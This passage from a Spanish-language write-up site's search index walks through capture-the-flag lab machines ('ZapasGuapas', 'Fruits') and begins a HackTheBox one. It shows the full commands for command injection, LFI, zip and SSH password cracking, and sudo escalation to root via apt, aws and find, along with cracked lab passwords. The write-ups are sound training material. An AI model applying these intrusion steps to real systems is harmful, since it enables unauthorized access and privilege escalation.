Words: 2769, Lines: 178, Duration: 1ms] login.html [Status: 200, Size: 2090, Words: 531, Lines: 50, Duration: 2ms] images [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 60ms] bin [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1ms] css [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms] index.html [Status: 200, Size: 14085, Words: 4801, Lines: 274, Duration: 169ms] lib [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1ms] js [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 0ms] javascript [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 2ms] include [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 0ms] testimonial.html [Status: 200, Size: 8587, Words: 2719, Lines: 173, Duration: 3ms] nike.php [Status: 200, Size: 2362, Words: 607, Lines: 78, Duration: 1ms]\rVemos que hay un login.html vamos a ver como es:\nVamos a probar credenciales t√≠picas:\nadmin / admin administrator / admin123 Pero nada funciona, vamos a ver como se tramita nuestra data por detr√°s con BurpSuite, para ello interceptaremos la consulta de inicio de sesi√≥n:\nShell as www-data Vamos a enviarlo al Repeater. Si nos fijamos podremos ver que esta usando el archivo run_command.php as√≠ que seguramente este usando uno de los inputs para ejecutar X acci√≥n vamos a probar con el par√°metro username:\nNada, vamos a probar con el par√°metro password:\nTenemos ejecuci√≥n de c√≥digo!! Vamos a enviarnos una reverse shell:\nShell as pronike Si leemos el /etc/passwd podremos ver 4 usuarios:\nwww-data@zapasguapas:/var/www/tienda$ cat /etc/passwd | grep bash root:x:0:0:root:/root:/bin/bash test:x:1000:1000:test,,,:/home/test:/bin/bash proadidas:x:1001:1001::/home/proadidas:/bin/bash pronike:x:1002:1002::/home/pronike:/bin/bash\rVamos a ver ambos home, en el home del usuario pronike podremos ver un archivo llamado nota.txt:\nwww-data@zapasguapas:/home$ ls pronike nota.txt\rVamos a leerlo:\nwww-data@zapasguapas:/home$ cat pronike/nota.txt Creo que proadidas esta detras del robo de mi contrase√±a\rVemos que el usuario comenta que proadidas le robo la contrase√±a, as√≠ que vamos a ir a su home para ver si las encontramos:\nwww-data@zapasguapas:/home$ ls -la proadidas total 32 drwxr-xr-x 3 proadidas proadidas 4096 Jul 17 15:52 . drwxr-xr-x 4 root root 4096 Apr 23 2024 .. lrwxrwxrwx 1 root root 9 Apr 23 2024 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 proadidas proadidas 220 Apr 23 2023 .bash_logout -rw-r--r-- 1 proadidas proadidas 3526 Apr 23 2023 .bashrc -rw------- 1 proadidas proadidas 38 Jul 17 15:52 .lesshst drwxr-xr-x 3 proadidas proadidas 4096 Apr 23 2024 .local -rw-r--r-- 1 proadidas proadidas 807 Apr 23 2023 .profile -r-------- 1 root root 33 Apr 17 2024 user.txt\rNo vemos nada interesante\u0026hellip; Buscando por directorios encontr√© lo siguiente en /opt/:\nwww-data@zapasguapas:/opt$ ls importante.zip\rVamos a abrir un servidor en python3 y descargarnoslo:\nwww-data@zapasguapas:/opt$ python3 -m http.server 8082\r‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/content] ‚îî‚îÄ$ wget 192.168.231.131:8082/importante.zip Prepended http:// to \u0026#39;192.168.231.131:8082/importante.zip\u0026#39; --2025-07-17 14:09:05-- http://192.168.231.131:8082/importante.zip Connecting to 192.168.231.131:8082... connected. HTTP request sent, awaiting response... 200 OK Length: 266 [application/zip] Saving to: ‚Äòimportante.zip‚Äô importante.zip 100%[=================================================================================================\u0026gt;] 266 --.-KB/s in 0s 2025-07-17 14:09:05 (60.8 MB/s) - ‚Äòimportante.zip‚Äô saved [266/266]\rBien vamos a intentar descomprimirlo:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/content] ‚îî‚îÄ$ unzip importante.zip Archive: importante.zip [importante.zip] password.txt password:\rNos piden credenciales, as√≠ que vamos a crackearlo. Para ello sacaremos su hash con zip2john:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/content] ‚îî‚îÄ$ zip2john importante.zip \u0026gt; hash ver 2.0 efh 5455 efh 7875 importante.zip/password.txt PKZIP Encr: TS_chk, cmplen=76, decmplen=71, crc=9CB8F6B5 ts=4C4E cs=4c4e type=8\rAhora vamos a crackearlo con el diccionario rockyou.txt con john indicandole el formato PKZIP:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/content] ‚îî‚îÄ$ john -w=/usr/share/wordlists/rockyou.txt hash --format=PKZIP Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hotstuff (importante.zip/password.txt) 1g 0:00:00:00 DONE (2025-07-17 14:11) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.\rAhora vamos a descomprimirlo:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/content] ‚îî‚îÄ$ unzip importante.zip Archive: importante.zip [importante.zip] password.txt password: inflating: password.txt\rVemos el archivo password.txt vamos a ver su contenido:\nHe conseguido la contrase√±a de pronike. Adidas FOREVER!!!! pronike11\rBien tenemos las credenciales del usuario pronike vamos acceder por SSH:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/content] ‚îî‚îÄ$ ssh pronike@192.168.231.131 pronike@192.168.231.131\u0026#39;s password: Linux zapasguapas 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jul 17 15:45:49 2025 from 192.168.231.128 pronike@zapasguapas:~$\rBien!! Estamos como el usuario pronike\nShell as proadidas Vamos a ver si tiene permisos SUDOERS este usuario:\npronike@zapasguapas:~$ sudo -l Matching Defaults entries for pronike on zapasguapas: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User pronike may run the following commands on zapasguapas: (proadidas) NOPASSWD: /usr/bin/apt\rBien vamos a abusar de el de la siguiente manera:\nsudo -u proadidas /usr/bin/apt changelog apt !/bin/bash\rpronike@zapasguapas:~$ sudo -u proadidas /usr/bin/apt changelog apt Des:1 https://metadata.ftp-master.debian.org apt 2.6.1 Changelog [505 kB] Descargados 505 kB en 1s (564 kB/s) proadidas@zapasguapas:/home/pronike$\rBien!! Ya somos el usuario proadidas.\nShell as root Volvamos a ver si tiene permisos SUDOERS:\nproadidas@zapasguapas:/home/pronike$ sudo -l Matching Defaults entries for proadidas on zapasguapas: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User proadidas may run the following commands on zapasguapas: (proadidas) NOPASSWD: /usr/bin/apt (root) NOPASSWD: /usr/bin/aws\rVemos que puede usar el binario aws como root sin necesidad de contrase√±a, si lo buscamos por GTFObins nos comenta lo siguiente:\nBien vamos a abusar de el:\nproadidas@zapasguapas:/home/pronike$ sudo aws help root@zapasguapas:/home/pronike# whoami root root@zapasguapas:/home/pronike#\rroot! ;)\nRese√±a ","date":"2025-07-17","id":14,"permalink":"/writeups/thehackerslabs/zapasguapas/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Zapasguapas/nmap] ‚îî‚îÄ$ nmap -p- --open --min-rate=5000 -n -Pn -vvv 192.168.231.131 Starting Nmap 7.","tags":[],"title":"ZapasGuapas"},{"content":"Enumeration Vamos a empezar con un buen escaneo nmap:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Fruits/nmap] ‚îî‚îÄ$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.129 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 12:27 CEST Initiating ARP Ping Scan at 12:27 Scanning 192.168.231.129 [1 port] Completed ARP Ping Scan at 12:27, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 12:27 Scanning 192.168.231.129 [65535 ports] Discovered open port 80/tcp on 192.168.231.129 Discovered open port 22/tcp on 192.168.231.129 Completed SYN Stealth Scan at 12:27, 0.80s elapsed (65535 total ports) Nmap scan report for 192.168.231.129 Host is up, received arp-response (0.000043s latency). Scanned at 2025-07-15 12:27:48 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:DC:2D:B0 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVemos el puerto 80 y 22 abiertos, vamos a enumerar su servicio y dicha versi√≥n de el:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Fruits/nmap] ‚îî‚îÄ$ nmap -p22,80 -sCV 192.168.231.129 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 12:29 CEST Nmap scan report for 192.168.231.129 Host is up (0.00016s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 ae:dd:1a:b6:db:a7:c7:8c:f3:03:b8:05:da:e0:51:68 (ECDSA) |_ 256 68:16:a7:3a:63:0c:8b:f6:ba:a1:ff:c0:34:e8:bf:80 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: P\\xC3\\xA1gina de Frutas |_http-server-header: Apache/2.4.57 (Debian) MAC Address: 00:0C:29:DC:2D:B0 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.52 seconds\rObtenemos la siguiente informaci√≥n:\nPuerto Descripci√≥n 22/tcp OpenSSH 9.2p1 Debian 80/tcp Apache httpd 2.4.57 ((Debian)) Vemos que el posible sistema operativo puede ser un Debian . Vamos a ver la web:\nVemos que es un buscador de frutas, vamos a buscar algo al azar:\nVemos que el archivo buscar.php no existe, as√≠ que casi nos cuelan un rabbit hole. Vamos a hacer fuzzing:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Fruits/nmap] ‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.231.129/FUZZ\u0026#34; -e .php,.html,.js,.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.129/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.html [Status: 200, Size: 1811, Words: 598, Lines: 66, Duration: 1ms] .html [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 0ms] [Status: 200, Size: 1811, Words: 598, Lines: 66, Duration: 1ms] .php [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3ms] fruits.php [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 0ms]\rVemos el archivo fruits.php , vamos a ver que contiene:\nVemos que est√° en blanco, vamos a hacer fuzzing por par√°metros:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Fruits/nmap] ‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u \u0026#34;http://192.168.231.129/fruits.php?FUZZ=value\u0026#34; -e .php,.html,.js,.txt -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.129/fruits.php?FUZZ=value :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response words: 1 ________________________________________________ :: Progress: [32265/32265] :: Job [1/1] :: 83 req/sec :: Duration: [0:00:04] :: Errors: 0 ::\rVemos que no devuleve ning√∫no, ya que seguramente est√© esperando que apuntemos algo en concreto, vamos a probar con un LFI:\nShell as bananaman ?FUZZ=/etc/passwd ‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Fruits/nmap] ‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u \u0026#34;http://192.168.231.129/fruits.php?FUZZ=/etc/passwd\u0026#34; -e .php,.html,.js,.txt -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.129/fruits.php?FUZZ=/etc/passwd :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response words: 1 ________________________________________________ file [Status: 200, Size: 1128, Words: 6, Lines: 25, Duration: 0ms] :: Progress: [32265/32265] :: Job [1/1] :: 76 req/sec :: Duration: [0:00:04] :: Errors: 0 ::\rVemos que hay una potencial via por LFI , vamos a comprobarlo en la aplicaci√≥n web:\nTenemos un LFI , vemos el usuario bananaman . Vamos a intentar hacer fuerza bruta al servicio de SSH empleando como usuario bananaman :\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Fruits/nmap] ‚îî‚îÄ$ hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://192.168.231.129 Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-15 12:37:33 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ssh://192.168.231.129:22/ [STATUS] 243.00 tries/min, 243 tries in 00:01h, 14344160 to do in 983:50h, 12 active [22][ssh] host: 192.168.231.129 login: bananaman password: celtic 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 4 final worker threads did not complete until end. [ERROR] 4 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-15 12:38:37\rVamos a acceder como el:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Fruits/nmap] ‚îî‚îÄ$ ssh bananaman@192.168.231.129 bananaman@192.168.231.129\u0026#39;s password: Linux Fruits 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Jul 15 14:23:08 2025 from 192.168.231.128 bananaman@Fruits:~$\rShell as root Teniendo las credenciales v√°lidas del usuario bananaman , vamos a ver si tiene alg√∫n permiso en el sudoers:\nbananaman@Fruits:~$ sudo -l Matching Defaults entries for bananaman on Fruits: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User bananaman may run the following commands on Fruits: (ALL) NOPASSWD: /usr/bin/find\rPodemos usar como cualquier usuario sin necesidad de contrase√±a el binario find , si buscamos en GTFObins lo encontraremos:\nhttps://gtfobins.github.io/gtfobins/find/\nVamos a poner lo indicado:\nsudo find . -exec /bin/bash \\; -quit\rroot@Fruits:/home/bananaman# whoami; hostname -I root 192.168.231.129\rroot! ;)\nRese√±a ","date":"2025-07-15","id":15,"permalink":"/writeups/thehackerslabs/fruits/","summary":"Enumeration Vamos a empezar con un buen escaneo nmap:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Fruits/nmap] ‚îî‚îÄ$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.129 Starting Nmap 7.","tags":[],"title":"Fruits"},{"content":"Bienvenidos al apartado de Challenges, donde subir√© gran mayoria retos de Web. De plataformas como HackTheBox, HackMyVM\u0026hellip;\nPlataformas 0\n0\n3\n0\nTipos Web\n3\nPhising\n0\n","date":"2023-09-07","id":16,"permalink":"/challenges/intro/bienvenido/","summary":"Bienvenidos al apartado de Challenges, donde subir√© gran mayoria retos de Web. De plataformas como HackTheBox, HackMyVM\u0026hellip;\nPlataformas 0\n0","tags":[],"title":"üëã Bienvenido"},{"content":"Bienvenidos a la secci√≥n de Writeups, donde subir√© writeups de plataformas como HackTheBox.\nEstad√≠sticas writeups 1\n0\n1\n3\n5\n1\n0\n11\n0\n0\nEasy\n10\nMedium\n1\nHard\n0\nInsane\n0\n","date":"2023-09-07","id":17,"permalink":"/writeups/intro/bienvenido/","summary":"Bienvenidos a la secci√≥n de Writeups, donde subir√© writeups de plataformas como HackTheBox.\nEstad√≠sticas writeups 1\n0\n1\n3\n5","tags":[],"title":"üëã Bienvenido"},{"content":"Enumeration Comenzaremos con un escaneo nmap:\n# Nmap 7.94SVN scan initiated Sun Aug 18 00:54:24 2024 as: nmap -p- --open -sCVS -vvv -n -Pn -oN target 10.10.10.245 Nmap scan report for 10.10.10.245 Host is up, received user-set (0.11s latency). Scanned at 2024-08-18 00:54:24 CEST for 176s Not shown: 63221 closed tcp ports (reset), 2311 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkya ynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZ bB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPP mrKMa9NPh1sjHSdS8IwiH12V0= | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI= | 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH 80/tcp open http syn-ack ttl 63 gunicorn | http-methods: |_ Supported Methods: HEAD GET OPTIONS |_http-title: Security Dashboard |_http-server-header: gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Sat, 17 Aug 2024 22:55:27 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 17 Aug 2024 22:55:21 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Security Dashboard\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/images/icon/favicon.ico\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/themify-icons.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/metisMenu.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/slicknav.min.css\u0026#34;\u0026gt; | \u0026lt;!-- amchar | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 17 Aug 2024 22:55:22 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, GET, OPTIONS | Content-Length: 0 | RTSPRequest: | HTTP/1.1 400 Bad Request | Connection: close | Content-Type: text/html | Content-Length: 196 | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Bad Request\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt; | Invalid HTTP Version \u0026amp;#x27;Invalid HTTP Version: \u0026amp;#x27;RTSP/1.0\u0026amp;#x27;\u0026amp;#x27; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.94SVN%I=7%D=8/18%Time=66C12A4C%P=x86_64-pc-linux-gnu%r(G SF:etRequest,2F4C,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\ SF:x20Sat,\\x2017\\x20Aug\\x202024\\x2022:55:21\\x20GMT\\r\\nConnection:\\x20close SF:\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20 SF:19386\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang=\\\u0026#34;en\\ SF:\u0026#34;\u0026gt;\\n\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\\u0026#34;\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\u0026lt;title\u0026gt;Security\\x20Dashboard\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;me SF:ta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial-sca SF:le=1\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;shortcut\\x20icon\\\u0026#34;\\x20type=\\\u0026#34;im SF:age/png\\\u0026#34;\\x20href=\\\u0026#34;/static/images/icon/favicon\\.ico\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x SF:20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/bootstrap\\.min\\.css SF:\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/ SF:font-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\ SF:x20href=\\\u0026#34;/static/css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20r SF:el=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/metisMenu\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/owl\\.carousel\\.mi SF:n\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/stati SF:c/css/slicknav\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--\\x20amchar\u0026#34;)%r(HTTPOpt SF:ions,B3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Sat, SF:\\x2017\\x20Aug\\x202024\\x2022:55:22\\x20GMT\\r\\nConnection:\\x20close\\r\\nCon SF:tent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20HEAD,\\x20GET,\\x2 SF:0OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,121,\u0026#34;HTTP/1\\.1 SF:\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20t SF:ext/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\ SF:x20\\x20\\x20\u0026lt;title\u0026gt;Bad\\x20Request\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\u0026lt;bod 